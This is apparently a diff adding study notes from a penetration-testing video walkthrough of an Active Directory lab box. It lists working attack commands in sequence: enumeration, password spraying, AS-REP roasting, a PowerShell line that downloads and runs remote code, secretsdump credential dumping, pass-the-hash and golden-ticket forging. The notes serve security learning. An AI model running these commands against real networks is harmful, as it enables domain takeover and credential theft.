@@ -1,0 +1,55 @@
+# nmap -v -sC -sV -oA nmap/result IP (-v is to see open ports as it displays them)
+# nmap -p- -v -oA nmap/result2 IP (-p- to see all ports)
+port 445 SMB: # smbclient -L IP (anonymous access)
+port 53 DNS: make the box leak its hostname: # nslookup; server IP; 127.0.0.1; 127.0.0.2; IP (lookup itself)
+When doing ping, Windows default ttl is 128 (time to leave). Linux default is 64. Cisco router 255. Above 128 -> network infrastructure. 65 to 128 -> Windows. 64 and below 64 is Linux, OpenBSD, etc.
+port 389 LDAP: # ldapsearch -h IP (-x for simple authentication)
+# ldapsearch -h IP -x -s base namingcontexts (this will give us the DN). Also -b basedn (obtained before) will drop info, where we can find USERS
+At ippsec.rocks you can find all the things he explained
+LDAP uses Windows timestamp to human (different than epoc)
+Get info that will be useful for password spray attacks
+Obtain sAMAccountName to do the password spray
+He's now generating a wordlist. He writes down some words and then does
+# for i in $(cat wordlist.txt); do echo $i; echo ${i}2019; echo ${i}2020; done (adds 2019 and 2020 to all words)
+To improve the wordlist, he does # hashcat --force --stdout wordlist.txt -r /usr/share/hashcat/rules/best64.rule
+Can also improve it with toggles (capitalising or lowercasing letters): he adds -r /usr/share/hashcat/rules/toggles1.rule to the prior command
+There's a lot of duplicates, ensure to sort -u (unique)
+# crackmapexec smb IP --pass-pol -u '' -p '' (dump password policy with blank username and password to do a null auth attempt) This will generally work in a lot of domains that have been upgraded from 2003. Windows now does not allow null authentication. NULL AUTHENTICATION ALLOWS DOMAIN ENUMERATIONAND YOU CAN GET A LOT OF INFO
+One such info is "Account lockout threshold", so we can know if we can safely bruteforce things.
+# enum4linux IP (not very much updated)
+# rpcclient -U '' IP (blank username). Enter on password. Then enumdomains/users/etc
+	rpcclient- queryusergroups [rid] 
+	querygroup [rid]
+crackmapexec smb [IP] -u userlist.out -p pwlist.txt (it needs to say Pwned! for us to be able to achieve sth)
+COOL STUFF: /usr/share/doc/python3-impacket/examples: SecureAuth utilities
+IN impacket: ./GetNPUsers.py (for kerberos) -dc-ip [IP] -request 'domain/' -format hashcat
+AN alternative to hashid: hashcat --example-hashes
+For password cracking he adds a -r rules/InsidePro-PasswordsPro.rule
+crackmapexec smb [IP] -u user -p password --shares (enums all shares)
+wsman on port 5985 (this is win-rm, powershell remoting)
+# cd /opt/evil-winrm; ./evil-winrm.rb -u user -p pass -i IP
+He runs winpeas. 
+	In Local: impacket-smbserver NAME directoryToShare -smb2support -user RANDOMUser -password SOMEPassword
+	In evil-winrm: $pass = convertto-securestring 'SOMEPassword' -AsPlainText -Force
+			$cred = New-Object System.Management.Automation.PSCredential('RANDOMUser',$pass)
+			New-PSDrive -Name NAME -PSProvider FileSystem -Credential $cred -Root \\Localtun0IP\directoryToShare
+	We can now go to ippsec drive and copy winpeas
+In a Domain Controller: bloodhund. Need to clone repo (sharphound) + download release + startup neo4j
+In remote: sharphound -c all. Then load zip to bloodhound. May wanna change file names in case there's a security software
+You can get a graph of what to do with the user you owned
+In this case, the user is member of account operators group in AD, which can do a bunch of things, such as create and modify accounts.
+He creates a new user: # net user ippsec Password /add /domain (there's another way in PowerShell, such info can be found in bloodhund Abuse Info)
+# net group "Group name" /add ippsec
+Anything in Bloodhund is based on PowerView? (PowerSploit)
+To pull (or execute?) from http server in PS: # IEX(New-Object Net.WebClient).downloadString('http://...')
+locate secretsdump.py (impacket utility): # ./secretsdump.py FQDN/user:pass@IP
+# crackmapexec smb 10.10.10.161 -u user -H hash
+# psexec.py -hashes LMHASH(can be blank):NTHASH(got fom secrestdump) user@IP
+
+Golden ticket kerberos. Look for krbtgt. Normally he does it from mimikatz, but he's doing it from linux now
+From secrets dump: Signing key windows uses to sign tickets
+SID information
+Kerberos will not validate the ticket because it is signed by the domain. This happens so as to not generate that much latency
+Always use the FQDN
+python ticketer.py -nthash hash -domain-sid sid -domain FQDN Username
+psexec(impacket) gives system. wmiexec(impacket) gives administrator
